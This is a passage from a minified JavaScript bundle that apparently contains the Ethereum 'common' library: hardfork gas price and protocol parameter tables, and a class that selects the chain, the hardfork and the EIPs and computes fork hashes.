                        address: {
                            v: 2,
                            d: "Base fee of the ADDRESS opcode"
                        },
                        balance: {
                            v: 20,
                            d: "Base fee of the BALANCE opcode"
                        },
                        origin: {
                            v: 2,
                            d: "Base fee of the ORIGIN opcode"
                        },
                        caller: {
                            v: 2,
                            d: "Base fee of the CALLER opcode"
                        },
                        callvalue: {
                            v: 2,
                            d: "Base fee of the CALLVALUE opcode"
                        },
                        calldataload: {
                            v: 3,
                            d: "Base fee of the CALLDATALOAD opcode"
                        },
                        calldatasize: {
                            v: 2,
                            d: "Base fee of the CALLDATASIZE opcode"
                        },
                        calldatacopy: {
                            v: 3,
                            d: "Base fee of the CALLDATACOPY opcode"
                        },
                        codesize: {
                            v: 2,
                            d: "Base fee of the CODESIZE opcode"
                        },
                        codecopy: {
                            v: 3,
                            d: "Base fee of the CODECOPY opcode"
                        },
                        gasprice: {
                            v: 2,
                            d: "Base fee of the GASPRICE opcode"
                        },
                        extcodesize: {
                            v: 20,
                            d: "Base fee of the EXTCODESIZE opcode"
                        },
                        extcodecopy: {
                            v: 20,
                            d: "Base fee of the EXTCODECOPY opcode"
                        },
                        blockhash: {
                            v: 20,
                            d: "Base fee of the BLOCKHASH opcode"
                        },
                        coinbase: {
                            v: 2,
                            d: "Base fee of the COINBASE opcode"
                        },
                        timestamp: {
                            v: 2,
                            d: "Base fee of the TIMESTAMP opcode"
                        },
                        number: {
                            v: 2,
                            d: "Base fee of the NUMBER opcode"
                        },
                        difficulty: {
                            v: 2,
                            d: "Base fee of the DIFFICULTY opcode"
                        },
                        gaslimit: {
                            v: 2,
                            d: "Base fee of the GASLIMIT opcode"
                        },
                        pop: {
                            v: 2,
                            d: "Base fee of the POP opcode"
                        },
                        mload: {
                            v: 3,
                            d: "Base fee of the MLOAD opcode"
                        },
                        mstore: {
                            v: 3,
                            d: "Base fee of the MSTORE opcode"
                        },
                        mstore8: {
                            v: 3,
                            d: "Base fee of the MSTORE8 opcode"
                        },
                        sstore: {
                            v: 0,
                            d: "Base fee of the SSTORE opcode"
                        },
                        jump: {
                            v: 8,
                            d: "Base fee of the JUMP opcode"
                        },
                        jumpi: {
                            v: 10,
                            d: "Base fee of the JUMPI opcode"
                        },
                        pc: {
                            v: 2,
                            d: "Base fee of the PC opcode"
                        },
                        msize: {
                            v: 2,
                            d: "Base fee of the MSIZE opcode"
                        },
                        gas: {
                            v: 2,
                            d: "Base fee of the GAS opcode"
                        },
                        push: {
                            v: 3,
                            d: "Base fee of the PUSH opcode"
                        },
                        dup: {
                            v: 3,
                            d: "Base fee of the DUP opcode"
                        },
                        swap: {
                            v: 3,
                            d: "Base fee of the SWAP opcode"
                        },
                        callcode: {
                            v: 40,
                            d: "Base fee of the CALLCODE opcode"
                        },
                        return: {
                            v: 0,
                            d: "Base fee of the RETURN opcode"
                        },
                        invalid: {
                            v: 0,
                            d: "Base fee of the INVALID opcode"
                        },
                        selfdestruct: {
                            v: 0,
                            d: "Base fee of the SELFDESTRUCT opcode"
                        }
                    },
                    vm: {
                        stackLimit: {
                            v: 1024,
                            d: "Maximum size of VM stack allowed"
                        },
                        callCreateDepth: {
                            v: 1024,
                            d: "Maximum depth of call/create stack"
                        },
                        maxExtraDataSize: {
                            v: 32,
                            d: "Maximum size extra data may be after Genesis"
                        }
                    },
                    pow: {
                        minimumDifficulty: {
                            v: 131072,
                            d: "The minimum that the difficulty may ever be"
                        },
                        difficultyBoundDivisor: {
                            v: 2048,
                            d: "The bound divisor of the difficulty, used in the update calculations"
                        },
                        durationLimit: {
                            v: 13,
                            d: "The decision boundary on the blocktime duration used to determine whether difficulty should go up or not"
                        },
                        epochDuration: {
                            v: 3e4,
                            d: "Duration between proof-of-work epochs"
                        },
                        timebombPeriod: {
                            v: 1e5,
                            d: "Exponential difficulty timebomb period"
                        },
                        minerReward: {
                            v: "5000000000000000000",
                            d: "the amount a miner get rewarded for mining a block"
                        },
                        difficultyBombDelay: {
                            v: 0,
                            d: "the amount of blocks to delay the difficulty bomb with"
                        }
                    }
                },
                homestead: {
                    name: "homestead",
                    comment: "Homestead hardfork with protocol and network changes",
                    url: "https://eips.ethereum.org/EIPS/eip-606",
                    status: "Final",
                    gasConfig: {},
                    gasPrices: {
                        delegatecall: {
                            v: 40,
                            d: "Base fee of the DELEGATECALL opcode"
                        }
                    },
                    vm: {},
                    pow: {}
                },
                dao: {
                    name: "dao",
                    comment: "DAO rescue hardfork",
                    url: "https://eips.ethereum.org/EIPS/eip-779",
                    status: "Final",
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {}
                },
                tangerineWhistle: {
                    name: "tangerineWhistle",
                    comment: "Hardfork with gas cost changes for IO-heavy operations",
                    url: "https://eips.ethereum.org/EIPS/eip-608",
                    status: "Final",
                    gasConfig: {},
                    gasPrices: {
                        sload: {
                            v: 200,
                            d: "Once per SLOAD operation"
                        },
                        call: {
                            v: 700,
                            d: "Once per CALL operation & message call transaction"
                        },
                        extcodesize: {
                            v: 700,
                            d: "Base fee of the EXTCODESIZE opcode"
                        },
                        extcodecopy: {
                            v: 700,
                            d: "Base fee of the EXTCODECOPY opcode"
                        },
                        balance: {
                            v: 400,
                            d: "Base fee of the BALANCE opcode"
                        },
                        delegatecall: {
                            v: 700,
                            d: "Base fee of the DELEGATECALL opcode"
                        },
                        callcode: {
                            v: 700,
                            d: "Base fee of the CALLCODE opcode"
                        },
                        selfdestruct: {
                            v: 5e3,
                            d: "Base fee of the SELFDESTRUCT opcode"
                        }
                    },
                    vm: {},
                    pow: {}
                },
                spuriousDragon: {
                    name: "spuriousDragon",
                    comment: "HF with EIPs for simple replay attack protection, EXP cost increase, state trie clearing, contract code size limit",
                    url: "https://eips.ethereum.org/EIPS/eip-607",
                    status: "Final",
                    gasConfig: {},
                    gasPrices: {
                        expByte: {
                            v: 50,
                            d: "Times ceil(log256(exponent)) for the EXP instruction"
                        }
                    },
                    vm: {
                        maxCodeSize: {
                            v: 24576,
                            d: "Maximum length of contract code"
                        }
                    },
                    pow: {}
                },
                byzantium: {
                    name: "byzantium",
                    comment: "Hardfork with new precompiles, instructions and other protocol changes",
                    url: "https://eips.ethereum.org/EIPS/eip-609",
                    status: "Final",
                    gasConfig: {},
                    gasPrices: {
                        modexpGquaddivisor: {
                            v: 20,
                            d: "Gquaddivisor from modexp precompile for gas calculation"
                        },
                        ecAdd: {
                            v: 500,
                            d: "Gas costs for curve addition precompile"
                        },
                        ecMul: {
                            v: 4e4,
                            d: "Gas costs for curve multiplication precompile"
                        },
                        ecPairing: {
                            v: 1e5,
                            d: "Base gas costs for curve pairing precompile"
                        },
                        ecPairingWord: {
                            v: 8e4,
                            d: "Gas costs regarding curve pairing precompile input length"
                        },
                        revert: {
                            v: 0,
                            d: "Base fee of the REVERT opcode"
                        },
                        staticcall: {
                            v: 700,
                            d: "Base fee of the STATICCALL opcode"
                        },
                        returndatasize: {
                            v: 2,
                            d: "Base fee of the RETURNDATASIZE opcode"
                        },
                        returndatacopy: {
                            v: 3,
                            d: "Base fee of the RETURNDATACOPY opcode"
                        }
                    },
                    vm: {},
                    pow: {
                        minerReward: {
                            v: "3000000000000000000",
                            d: "the amount a miner get rewarded for mining a block"
                        },
                        difficultyBombDelay: {
                            v: 3e6,
                            d: "the amount of blocks to delay the difficulty bomb with"
                        }
                    }
                },
                constantinople: {
                    name: "constantinople",
                    comment: "Postponed hardfork including EIP-1283 (SSTORE gas metering changes)",
                    url: "https://eips.ethereum.org/EIPS/eip-1013",
                    status: "Final",
                    gasConfig: {},
                    gasPrices: {
                        netSstoreNoopGas: {
                            v: 200,
                            d: "Once per SSTORE operation if the value doesn't change"
                        },
                        netSstoreInitGas: {
                            v: 2e4,
                            d: "Once per SSTORE operation from clean zero"
                        },
                        netSstoreCleanGas: {
                            v: 5e3,
                            d: "Once per SSTORE operation from clean non-zero"
                        },
                        netSstoreDirtyGas: {
                            v: 200,
                            d: "Once per SSTORE operation from dirty"
                        },
                        netSstoreClearRefund: {
                            v: 15e3,
                            d: "Once per SSTORE operation for clearing an originally existing storage slot"
                        },
                        netSstoreResetRefund: {
                            v: 4800,
                            d: "Once per SSTORE operation for resetting to the original non-zero value"
                        },
                        netSstoreResetClearRefund: {
                            v: 19800,
                            d: "Once per SSTORE operation for resetting to the original zero value"
                        },
                        shl: {
                            v: 3,
                            d: "Base fee of the SHL opcode"
                        },
                        shr: {
                            v: 3,
                            d: "Base fee of the SHR opcode"
                        },
                        sar: {
                            v: 3,
                            d: "Base fee of the SAR opcode"
                        },
                        extcodehash: {
                            v: 400,
                            d: "Base fee of the EXTCODEHASH opcode"
                        },
                        create2: {
                            v: 32e3,
                            d: "Base fee of the CREATE2 opcode"
                        }
                    },
                    vm: {},
                    pow: {
                        minerReward: {
                            v: "2000000000000000000",
                            d: "The amount a miner gets rewarded for mining a block"
                        },
                        difficultyBombDelay: {
                            v: 5e6,
                            d: "the amount of blocks to delay the difficulty bomb with"
                        }
                    }
                },
                petersburg: {
                    name: "petersburg",
                    comment: "Aka constantinopleFix, removes EIP-1283, activate together with or after constantinople",
                    url: "https://eips.ethereum.org/EIPS/eip-1716",
                    status: "Final",
                    gasConfig: {},
                    gasPrices: {
                        netSstoreNoopGas: {
                            v: null,
                            d: "Removed along EIP-1283"
                        },
                        netSstoreInitGas: {
                            v: null,
                            d: "Removed along EIP-1283"
                        },
                        netSstoreCleanGas: {
                            v: null,
                            d: "Removed along EIP-1283"
                        },
                        netSstoreDirtyGas: {
                            v: null,
                            d: "Removed along EIP-1283"
                        },
                        netSstoreClearRefund: {
                            v: null,
                            d: "Removed along EIP-1283"
                        },
                        netSstoreResetRefund: {
                            v: null,
                            d: "Removed along EIP-1283"
                        },
                        netSstoreResetClearRefund: {
                            v: null,
                            d: "Removed along EIP-1283"
                        }
                    },
                    vm: {},
                    pow: {}
                },
                istanbul: {
                    name: "istanbul",
                    comment: "HF targeted for December 2019 following the Constantinople/Petersburg HF",
                    url: "https://eips.ethereum.org/EIPS/eip-1679",
                    status: "Final",
                    gasConfig: {},
                    gasPrices: {
                        blake2Round: {
                            v: 1,
                            d: "Gas cost per round for the Blake2 F precompile"
                        },
                        ecAdd: {
                            v: 150,
                            d: "Gas costs for curve addition precompile"
                        },
                        ecMul: {
                            v: 6e3,
                            d: "Gas costs for curve multiplication precompile"
                        },
                        ecPairing: {
                            v: 45e3,
                            d: "Base gas costs for curve pairing precompile"
                        },
                        ecPairingWord: {
                            v: 34e3,
                            d: "Gas costs regarding curve pairing precompile input length"
                        },
                        txDataNonZero: {
                            v: 16,
                            d: "Per byte of data attached to a transaction that is not equal to zero. NOTE: Not payable on data of calls between transactions"
                        },
                        sstoreSentryGasEIP2200: {
                            v: 2300,
                            d: "Minimum gas required to be present for an SSTORE call, not consumed"
                        },
                        sstoreNoopGasEIP2200: {
                            v: 800,
                            d: "Once per SSTORE operation if the value doesn't change"
                        },
                        sstoreDirtyGasEIP2200: {
                            v: 800,
                            d: "Once per SSTORE operation if a dirty value is changed"
                        },
                        sstoreInitGasEIP2200: {
                            v: 2e4,
                            d: "Once per SSTORE operation from clean zero to non-zero"
                        },
                        sstoreInitRefundEIP2200: {
                            v: 19200,
                            d: "Once per SSTORE operation for resetting to the original zero value"
                        },
                        sstoreCleanGasEIP2200: {
                            v: 5e3,
                            d: "Once per SSTORE operation from clean non-zero to something else"
                        },
                        sstoreCleanRefundEIP2200: {
                            v: 4200,
                            d: "Once per SSTORE operation for resetting to the original non-zero value"
                        },
                        sstoreClearRefundEIP2200: {
                            v: 15e3,
                            d: "Once per SSTORE operation for clearing an originally existing storage slot"
                        },
                        balance: {
                            v: 700,
                            d: "Base fee of the BALANCE opcode"
                        },
                        extcodehash: {
                            v: 700,
                            d: "Base fee of the EXTCODEHASH opcode"
                        },
                        chainid: {
                            v: 2,
                            d: "Base fee of the CHAINID opcode"
                        },
                        selfbalance: {
                            v: 5,
                            d: "Base fee of the SELFBALANCE opcode"
                        },
                        sload: {
                            v: 800,
                            d: "Base fee of the SLOAD opcode"
                        }
                    },
                    vm: {},
                    pow: {}
                },
                muirGlacier: {
                    name: "muirGlacier",
                    comment: "HF to delay the difficulty bomb",
                    url: "https://eips.ethereum.org/EIPS/eip-2384",
                    status: "Final",
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {
                        difficultyBombDelay: {
                            v: 9e6,
                            d: "the amount of blocks to delay the difficulty bomb with"
                        }
                    }
                },
                berlin: {
                    name: "berlin",
                    comment: "HF targeted for July 2020 following the Muir Glacier HF",
                    url: "https://eips.ethereum.org/EIPS/eip-2070",
                    status: "Final",
                    eips: [2565, 2929, 2718, 2930]
                },
                london: {
                    name: "london",
                    comment: "HF targeted for July 2021 following the Berlin fork",
                    url: "https://github.com/ethereum/eth1.0-specs/blob/master/network-upgrades/mainnet-upgrades/london.md",
                    status: "Final",
                    eips: [1559, 3198, 3529, 3541]
                },
                shanghai: {
                    name: "shanghai",
                    comment: "Next feature hardfork after the merge hardfork having withdrawals, warm coinbase, push0, limit/meter initcode",
                    url: "https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/shanghai.md",
                    status: "Final",
                    eips: [3651, 3855, 3860, 4895]
                },
                arrowGlacier: {
                    name: "arrowGlacier",
                    comment: "HF to delay the difficulty bomb",
                    url: "https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/arrow-glacier.md",
                    status: "Final",
                    eips: [4345],
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {}
                },
                grayGlacier: {
                    name: "grayGlacier",
                    comment: "Delaying the difficulty bomb to Mid September 2022",
                    url: "https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/gray-glacier.md",
                    status: "Draft",
                    eips: [5133],
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {}
                },
                mergeForkIdTransition: {
                    name: "mergeForkIdTransition",
                    comment: "Pre-merge hardfork to fork off non-upgraded clients",
                    url: "https://eips.ethereum.org/EIPS/eip-3675",
                    status: "Draft",
                    eips: []
                },
                merge: {
                    name: "merge",
                    comment: "Hardfork to upgrade the consensus mechanism to Proof-of-Stake",
                    url: "https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/merge.md",
                    status: "Final",
                    consensus: {
                        type: "pos",
                        algorithm: "casper",
                        casper: {}
                    },
                    eips: [3675, 4399]
                }
            },
            {
                buf: Xd
            } = Wd;
        class $d extends Ks {
            constructor(e) {
                var t, n;
                super(), this._eips = [], this._customChains = null !== (t = e.customChains) && void 0 !== t ? t : [], this._chainParams = this.setChain(e.chain), this.DEFAULT_HARDFORK = null !== (n = this._chainParams.defaultHardfork) && void 0 !== n ? n : Cd.Merge, this.HARDFORK_CHANGES = this.hardforks().map((e => [e.name, Yd[e.name]])), this._hardfork = this.DEFAULT_HARDFORK, void 0 !== e.hardfork && this.setHardfork(e.hardfork), e.eips && this.setEIPs(e.eips)
            }
            static custom(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                var n;
                const r = null !== (n = t.baseChain) && void 0 !== n ? n : "mainnet",
                    i = Object.assign({}, $d._getChainParams(r));
                if (i.name = "custom-chain", "string" !== typeof e) return new $d(Object.assign({
                    chain: Object.assign(Object.assign({}, i), e)
                }, t));
                if (e === Pd.PolygonMainnet) return $d.custom({
                    name: Pd.PolygonMainnet,
                    chainId: 137,
                    networkId: 137
                }, t);
                if (e === Pd.PolygonMumbai) return $d.custom({
                    name: Pd.PolygonMumbai,
                    chainId: 80001,
                    networkId: 80001
                }, t);
                if (e === Pd.ArbitrumRinkebyTestnet) return $d.custom({
                    name: Pd.ArbitrumRinkebyTestnet,
                    chainId: 421611,
                    networkId: 421611
                }, t);
                if (e === Pd.ArbitrumOne) return $d.custom({
                    name: Pd.ArbitrumOne,
                    chainId: 42161,
                    networkId: 42161
                }, t);
                if (e === Pd.xDaiChain) return $d.custom({
                    name: Pd.xDaiChain,
                    chainId: 100,
                    networkId: 100
                }, t);
                if (e === Pd.OptimisticKovan) return $d.custom({
                    name: Pd.OptimisticKovan,
                    chainId: 69,
                    networkId: 69
                }, Object.assign({
                    hardfork: Cd.Berlin
                }, t));
                if (e === Pd.OptimisticEthereum) return $d.custom({
                    name: Pd.OptimisticEthereum,
                    chainId: 10,
                    networkId: 10
                }, Object.assign({
                    hardfork: Cd.Berlin
                }, t));
                throw new Error("Custom chain ".concat(e, " not supported"))
            }
            static fromGethGenesis(e, t) {
                let {
                    chain: n,
                    eips: r,
                    genesisHash: i,
                    hardfork: o,
                    mergeForkIdPostMerge: a
                } = t;
                var s;
                const c = function(e, t, n) {
                        try {
                            if (["config", "difficulty", "gasLimit", "alloc"].some((t => !(t in e)))) throw new Error("Invalid format, expected geth genesis fields missing");
                            return void 0 !== t && (e.name = t), Od(e, n)
                        } catch (Qy) {
                            throw new Error("Error parsing parameters file: ".concat(Qy.message))
                        }
                    }(e, n, a),
                    l = new $d({
                        chain: null !== (s = c.name) && void 0 !== s ? s : "custom",
                        customChains: [c],
                        eips: r,
                        hardfork: null !== o && void 0 !== o ? o : c.hardfork
                    });
                return void 0 !== i && l.setForkHashes(i), l
            }
            static isSupportedChainId(e) {
                const t = this._getInitializedChains();
                return Boolean(t.names[e.toString()])
            }
            static _getChainParams(e, t) {
                let n = e;
                const r = this._getInitializedChains(t);
                if ("number" === typeof n || "bigint" === typeof n) {
                    if (n = n.toString(), r.names[n]) {
                        return r[r.names[n]]
                    }
                    throw new Error("Chain with ID ".concat(n, " not supported"))
                }
                if (void 0 !== r[n]) return r[n];
                throw new Error("Chain with name ".concat(n, " not supported"))
            }
            setChain(e) {
                if ("number" === typeof e || "bigint" === typeof e || "string" === typeof e) this._chainParams = $d._getChainParams(e, this._customChains);
                else {
                    if ("object" !== typeof e) throw new Error("Wrong input format"); {
                        if (this._customChains.length > 0) throw new Error("Chain must be a string, number, or bigint when initialized with customChains passed in");
                        const t = ["networkId", "genesis", "hardforks", "bootstrapNodes"];
                        for (const n of t)
                            if (!(n in e)) throw new Error("Missing required chain parameter: ".concat(n));
                        this._chainParams = e
                    }
                }
                for (const t of this.hardforks())
                    if (void 0 === t.block) throw new Error("Hardfork cannot have undefined block number");
                return this._chainParams
            }
            setHardfork(e) {
                let t = !1;
                for (const n of this.HARDFORK_CHANGES) n[0] === e && (this._hardfork !== e && (this._hardfork = e, this.emit("hardforkChanged", e)), t = !0);
                if (!t) throw new Error("Hardfork with name ".concat(e, " not supported"))
            }
            getHardforkByBlockNumber(e, t, n) {
                const r = qd(e, Td.BigInt),
                    i = qd(t, Td.BigInt),
                    o = qd(n, Td.Number),
                    a = this.hardforks().filter((e => null !== e.block || null !== e.ttd && void 0 !== e.ttd || void 0 !== e.timestamp)),
                    s = a.findIndex((e => null !== e.ttd && void 0 !== e.ttd));
                if (a.slice(s + 1).findIndex((e => null !== e.ttd && void 0 !== e.ttd)) >= 0) throw Error("More than one merge hardforks found with ttd specified");
                let c = a.findIndex((e => null !== e.block && e.block > r || void 0 !== o && Number(e.timestamp) > o));
                if (-1 === c) c = a.length;
                else if (0 === c) throw Error("Must have at least one hardfork at block 0");
                if (void 0 === o) {
                    c -= a.slice(0, c).reverse().findIndex((e => null !== e.block || void 0 !== e.ttd))
                }
                if (c -= 1, null === a[c].block && void 0 === a[c].timestamp)(void 0 === i || null === i || BigInt(a[c].ttd) > i) && (c -= 1);
                else if (s >= 0 && void 0 !== i && null !== i) {
                    if (c >= s && BigInt(a[s].ttd) > i) throw Error("Maximum HF determined by total difficulty is lower than the block number HF");
                    if (c < s && BigInt(a[s].ttd) <= i) throw Error("HF determined by block number is lower than the minimum total difficulty HF")
                }
                const l = c;
                for (; c < a.length - 1 && (a[c].block === a[c + 1].block && a[c].timestamp === a[c + 1].timestamp); c += 1);
                if (o) {
                    const e = a.slice(0, l).reduce(((e, t) => {
                        var n;
                        return Math.max(Number(null !== (n = t.timestamp) && void 0 !== n ? n : "0"), e)
                    }), 0);
                    if (e > o) throw Error("Maximum HF determined by timestamp is lower than the block number/ttd HF");
                    const t = a.slice(c + 1).reduce(((e, t) => {
                        var n;
                        return Math.min(Number(null !== (n = t.timestamp) && void 0 !== n ? n : o), e)
                    }), o);
                    if (t < o) throw Error("Maximum HF determined by block number/ttd is lower than timestamp HF")
                }
                return a[c].name
            }
            setHardforkByBlockNumber(e, t, n) {
                const r = this.getHardforkByBlockNumber(e, t, n);
                return this.setHardfork(r), r
            }
            _getHardfork(e) {
                const t = this.hardforks();
                for (const n of t)
                    if (n.name === e) return n;
                return null
            }
            setEIPs() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : [];
                for (const t of e) {
                    if (!(t in Jd)) throw new Error("".concat(t, " not supported"));
                    const n = this.gteHardfork(Jd[t].minimumHardfork);
                    if (!n) throw new Error("".concat(t, " cannot be activated on hardfork ").concat(this.hardfork(), ", minimumHardfork: ").concat(n));
                    if (void 0 !== Jd[t].requiredEIPs)
                        for (const r of Jd[t].requiredEIPs)
                            if (!e.includes(r) && !this.isActivatedEIP(r)) throw new Error("".concat(t, " requires EIP ").concat(r, ", but is not included in the EIP list"))
                }
                this._eips = e
            }
            param(e, t) {
                let n;
                for (const r of this._eips)
                    if (n = this.paramByEIP(e, t, r), void 0 !== n) return n;
                return this.paramByHardfork(e, t, this._hardfork)
            }
            paramByHardfork(e, t, n) {
                let r = null;
                for (const i of this.HARDFORK_CHANGES) {
                    if ("eips" in i[1]) {
                        const n = i[1].eips;
                        for (const i of n) {
                            const n = this.paramByEIP(e, t, i);
                            r = "bigint" === typeof n ? n : r
                        }
                    } else {
                        if (void 0 === i[1][e]) throw new Error("Topic ".concat(e, " not defined"));
                        void 0 !== i[1][e][t] && (r = i[1][e][t].v)
                    }
                    if (i[0] === n) break
                }
                return BigInt(null !== r && void 0 !== r ? r : 0)
            }
            paramByEIP(e, t, n) {
                if (!(n in Jd)) throw new Error("".concat(n, " not supported"));
                const r = Jd[n];
                if (!(e in r)) throw new Error("Topic ".concat(e, " not defined"));
                if (void 0 === r[e][t]) return;
                const i = r[e][t].v;
                return BigInt(i)
            }
            paramByBlock(e, t, n, r, i) {
                const o = this.getHardforkByBlockNumber(n, r, i);
                return this.paramByHardfork(e, t, o)
            }
            isActivatedEIP(e) {
                if (this.eips().includes(e)) return !0;
                for (const t of this.HARDFORK_CHANGES) {
                    const n = t[1];
                    if (this.gteHardfork(n.name) && "eips" in n && n.eips.includes(e)) return !0
                }
                return !1
            }
            hardforkIsActiveOnBlock(e, t) {
                const n = qd(t, Td.BigInt),
                    r = null !== e && void 0 !== e ? e : this._hardfork,
                    i = this.hardforkBlock(r);
                return "bigint" === typeof i && i !== BigInt(0) && n >= i
            }
            activeOnBlock(e) {
                return this.hardforkIsActiveOnBlock(null, e)
            }
            hardforkGteHardfork(e, t) {
                const n = null !== e && void 0 !== e ? e : this._hardfork,
                    r = this.hardforks();
                let i = -1,
                    o = -1,
                    a = 0;
                for (const s of r) s.name === n && (i = a), s.name === t && (o = a), a += 1;
                return i >= o && -1 !== o
            }
            gteHardfork(e) {
                return this.hardforkGteHardfork(null, e)
            }
            hardforkBlock(e) {
                var t;
                const n = null !== e && void 0 !== e ? e : this._hardfork,
                    r = null === (t = this._getHardfork(n)) || void 0 === t ? void 0 : t.block;
                return void 0 === r || null === r ? null : BigInt(r)
            }
            hardforkTimestamp(e) {
                var t;
                const n = null !== e && void 0 !== e ? e : this._hardfork,
                    r = null === (t = this._getHardfork(n)) || void 0 === t ? void 0 : t.timestamp;
                return void 0 === r || null === r ? null : BigInt(r)
            }
            eipBlock(e) {
                for (const t of this.HARDFORK_CHANGES) {
                    const n = t[1];
                    if ("eips" in n && n.eips.includes(e)) return this.hardforkBlock("number" === typeof t[0] ? String(t[0]) : t[0])
                }
                return null
            }
            hardforkTTD(e) {
                var t;
                const n = null !== e && void 0 !== e ? e : this._hardfork,
                    r = null === (t = this._getHardfork(n)) || void 0 === t ? void 0 : t.ttd;
                return void 0 === r || null === r ? null : BigInt(r)
            }
            isHardforkBlock(e, t) {
                const n = qd(e, Td.BigInt),
                    r = null !== t && void 0 !== t ? t : this._hardfork,
                    i = this.hardforkBlock(r);
                return "bigint" === typeof i && i !== BigInt(0) && i === n
            }
            nextHardforkBlockOrTimestamp(e) {
                var t, n;
                const r = null !== e && void 0 !== e ? e : this._hardfork,
                    i = this.hardforks();
                let o = i.findIndex((e => e.name === r));
                if (r === Cd.Merge && (o -= 1), o < 0) return null;
                let a = null !== (t = i[o].timestamp) && void 0 !== t ? t : i[o].block;
                a = null !== a && void 0 !== a ? Number(a) : null;
                const s = i.slice(o + 1).find((e => {
                    var t;
                    let n = null !== (t = e.timestamp) && void 0 !== t ? t : e.block;
                    return n = null !== n && void 0 !== n ? Number(n) : null, e.name !== Cd.Merge && null !== n && void 0 !== n && n !== a
                }));
                if (void 0 === s) return null;
                const c = null !== (n = s.timestamp) && void 0 !== n ? n : s.block;
                return null === c || void 0 === c ? null : BigInt(c)
            }
            nextHardforkBlock(e) {
                const t = null !== e && void 0 !== e ? e : this._hardfork;
                let n = this.hardforkBlock(t);
                if (null === n && t === Cd.Merge) {
                    const e = this.hardforks(),
                        t = e.findIndex((e => null !== e.ttd && void 0 !== e.ttd));
                    if (t < 0) throw Error("Merge hardfork should have been found");
                    n = this.hardforkBlock(e[t - 1].name)
                }
                if (null === n) return null;
                return this.hardforks().reduce(((e, t) => {
                    const r = BigInt(null === t.block || void 0 !== t.ttd && null !== t.ttd ? 0 : t.block);
                    return r > n && null === e ? r : e
                }), null)
            }
            isNextHardforkBlock(e, t) {
                const n = qd(e, Td.BigInt),
                    r = null !== t && void 0 !== t ? t : this._hardfork,
                    i = this.nextHardforkBlock(r);
                return null !== i && i === n
            }
            _calcForkHash(e, t) {
                let n = new Uint8Array,
                    r = 0;
                for (const o of this.hardforks()) {
                    const {
                        block: t,
                        timestamp: i,
                        name: a
                    } = o;
                    let s = null !== i && void 0 !== i ? i : t;
                    if (s = null !== s ? Number(s) : null, "number" === typeof s && 0 !== s && s !== r && a !== Cd.Merge) {
                        n = gs(n, ks(s.toString(16).padStart(16, "0"))), r = s
                    }
                    if (o.name === e) break
                }
                const i = gs(t, n);
                return As(function(e) {
                    const t = Nd(e);
                    return ks("0x".concat(Rd(t.slice(2))))
                }(Xd(i) >>> 0))
            }
            forkHash(e, t) {
                const n = null !== e && void 0 !== e ? e : this._hardfork,
                    r = this._getHardfork(n);
                if (null === r || null === (null === r || void 0 === r ? void 0 : r.block) && void 0 === (null === r || void 0 === r ? void 0 : r.timestamp) && void 0 === (null === r || void 0 === r ? void 0 : r.ttd)) {
                    throw new Error("No fork hash calculation possible for future hardfork")
                }
                if (null !== (null === r || void 0 === r ? void 0 : r.forkHash) && void 0 !== (null === r || void 0 === r ? void 0 : r.forkHash)) return r.forkHash;
                if (!t) throw new Error("genesisHash required for forkHash calculation");
                return this._calcForkHash(n, t)
            }
            hardforkForForkHash(e) {
                const t = this.hardforks().filter((t => t.forkHash === e));
                return t.length >= 1 ? t[t.length - 1] : null
            }
            setForkHashes(e) {
                var t;
                for (const n of this.hardforks()) {
                    const r = null !== (t = n.timestamp) && void 0 !== t ? t : n.block;
                    null !== n.forkHash && void 0 !== n.forkHash || (null === r || void 0 === r) && "undefined" === typeof n.ttd || (n.forkHash = this.forkHash(n.name, e))
                }
            }
            genesis() {
                return this._chainParams.genesis
            }
            hardforks() {
                return this._chainParams.hardforks
            }
            bootstrapNodes() {
                return this._chainParams.bootstrapNodes
            }
            dnsNetworks() {
                return this._chainParams.dnsNetworks
            }
            hardfork() {
                return this._hardfork
            }
            chainId() {
                return BigInt(this._chainParams.chainId)
            }
            chainName() {
                return this._chainParams.name
            }
            networkId() {
                return BigInt(this._chainParams.networkId)
            }
            eips() {
                return this._eips
            }
            consensusType() {
                const e = this.hardfork();
                let t;
                for (const n of this.HARDFORK_CHANGES)
                    if ("consensus" in n[1] && (t = n[1].consensus.type), n[0] === e) break;
                return null !== t && void 0 !== t ? t : this._chainParams.consensus.type
            }
            consensusAlgorithm() {
                const e = this.hardfork();
                let t;
                for (const n of this.HARDFORK_CHANGES)
                    if ("consensus" in n[1] && (t = n[1].consensus.algorithm), n[0] === e) break;
                return null !== t && void 0 !== t ? t : this._chainParams.consensus.algorithm
            }
            consensusConfig() {
                var e;
                const t = this.hardfork();
                let n;
                for (const r of this.HARDFORK_CHANGES)
                    if ("consensus" in r[1] && (n = r[1].consensus[r[1].consensus.algorithm]), r[0] === t) break;
                return null !== (e = null !== n && void 0 !== n ? n : this._chainParams.consensus[this.consensusAlgorithm()]) && void 0 !== e ? e : {}
            }
            copy() {
                const e = Object.assign(Object.create(Object.getPrototypeOf(this)), this);
                return e.removeAllListeners(), e
            }
            static _getInitializedChains(e) {
                const t = {};
                for (const [r, i] of Object.entries(Sd)) t[i] = r.toLowerCase();
                const n = {
                    mainnet: Zd,
                    goerli: Vd,
                    sepolia: Kd
                };
                if (e)
                    for (const r of e) {
                        const {
                            name: e
                        } = r;
                        t[r.chainId.toString()] = e, n[e] = r
                    }
                return n.names = t, n
            }
        }
        var ef;

        function tf(e) {
            return ! function(e) {
                if (0 === e.length) return !0;
                const t = e[0];
                return !!Array.isArray(t)
            }(e)
        }! function(e) {
            e[e.EIP155ReplayProtection = 155] = "EIP155ReplayProtection", e[e.EIP1559FeeMarket = 1559] = "EIP1559FeeMarket", e[e.EIP2718TypedTransaction = 2718] = "EIP2718TypedTransaction", e[e.EIP2930AccessLists = 2930] = "EIP2930AccessLists"
        }(ef || (ef = {}));
        class nf {
            constructor(e) {
                if (20 !== e.length) throw new Error("Invalid address length");
                this.buf = e
            }
